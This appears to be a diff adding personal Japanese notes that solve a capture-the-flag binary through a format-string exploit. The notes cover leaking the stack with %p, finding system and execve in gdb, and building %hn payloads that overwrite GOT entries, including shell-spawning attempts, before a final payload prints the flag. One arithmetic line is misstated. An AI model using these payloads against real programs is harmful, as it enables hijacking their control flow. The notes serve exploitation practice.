@@ -1,0 +1,121 @@
+[q4@localhost ~]$ readelf -r q4
+
+Relocation section '.rel.dyn' at offset 0x3cc contains 2 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+080499cc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
+08049a04  00000b05 R_386_COPY        08049a04   stdin
+
+Relocation section '.rel.plt' at offset 0x3dc contains 9 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+080499dc  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
+080499e0  00000307 R_386_JUMP_SLOT   00000000   putchar
+080499e4  00000407 R_386_JUMP_SLOT   00000000   fgets
+080499e8  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main
+080499ec  00000607 R_386_JUMP_SLOT   00000000   fopen
+080499f0  00000707 R_386_JUMP_SLOT   00000000   printf
+080499f4  00000807 R_386_JUMP_SLOT   00000000   puts
+080499f8  00000c07 R_386_JUMP_SLOT   080484d4   __gxx_personality_v0
+080499fc  00000907 R_386_JUMP_SLOT   00000000   strcmp
+
+[q4@localhost ~]$ ./q4
+What's your name?
+AAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
+Hi, AAAAA,0x400,0x2db8c0,0x8,0x14,0x7ebfc4,0x41414141,0x70252c41,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,
+
+Do you want the flag?
+^C
+[q4@localhost ~]$
+
+6番目からローカル変数領域
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x1fcf60 <system>
+(gdb)
+
+system関数のaddressは0x1fcf60
+
+0x1fcf60 -> 2084704
+
+0xcf60 -> 53088
+0x001f -> 31
+
+53088 - 8 = 53080
+
+\xfc\x99\x04\x08\xfe\x99\x04\x08%53080x%6$hn%53057x%7$hn\n/bin/sh
+
+(echo -e '\xfc\x99\x04\x08\xfe\x99\x04\x08%53080x%6$hn%53057x%7$hn\n/bin/sh';cat)
+
+
+\xfc\x99\x04\x08%2084700x%6$hn\n/bin/sh
+
+
+(echo -e '\xe4\x99\x04\x08%2084700x%6$hn'; cat)
+
+(gdb) p execve
+$1 = {<text variable, no debug info>} 0xa80c60 <execve>
+
+0xa80c60 -> 11013216
+
+11013216 - 4 = 11013212
+
+(echo -e '\xfc\x99\x04\x08%11013212x%6$hn\n/bin/sh'; cat)
+
+/proc/sys/kernel/randomize_va_space
+
+
+0x56ef60 -> 5697376
+
+5697376 - 4 = 5697372
+
+\xf4\x99\x04\x08%5697376x%6$hn
+\xe4\x99\x04\x08%5697376x%6$hn
+
+
+0x080486a0に移す
+
+0x0804 -> 2052
+2052 - 8 = 2044
+0x86a0 -> 34464
+34464 - 2052 = 32412
+
+(echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%2044x%6$hn%32412x%7$hn'; cat)
+(echo -e '\xfc\x99\x04\x08\xfe\x99\x04\x08%2044x%6$hn%32412x%7$hn'; cat)
+
+----------------------------------------------
+ここから解答
+
+
+0x08048691に移す
+
+0x0804 -> 2052
+2052 - 8 = 2044
+0x8691 -> 34449
+34449 - 2052 = 32397
+
+そういえばリトルエンディアン・・・
+0x8691 -> 34449
+34449 - 8 = 34441
+0x0804 -> 2052
+
+(echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn'; cat) |./q4
+FLAG_nwW6eP503Q3QI0zw
+
+今回の場合，2回にわけて書き込んだ．１回だと，出力する文字数が多すぎてしまうから．
+アドレスの計算だが，出力バイト数がオーバーフローしている場合は，オーバーフローした値は無視して書き込みを行う．
+つまり，今回の場合２回に分けて４バイトを書き込んだので１回につき２バイト書き込んでいる．
+２バイトで表せる最大値というのは，2**8 = 256, 256 ** 2 = 65536である．
+
+最初は前方に８バイト既にあるので，まず書き込みたい34449(0x8691)から８を引いた34441を書く．
+その後の，数で2052(0x0804)書き込みたい時，前の数より小さくなってしまっている．
+この場合どうするのかというと，オーバーフローするぐらい大きな数字を指定して，オーバーフローさせてから，オーバーフローした数値を出力したい数字（2052）に合わせる．
+つまり，65536 - 34449(既に出力してある数) - 2052(出力したい数) = 33139
+この数字を34449に足すと，33139 + 34449 = 67588
+67588 - 65536 = 2052，つまり2052ぶんオーバーフローしているということ
+だから，この67588になるように，34449(既に出力してある数)に33139という数を足す．
+
+
+ももテク
+http://inaz2.hatenablog.com/entry/2014/04/20/041453
+
+愛甲さん
+http://07c00.hatenablog.com/entry/2013/08/10/112404
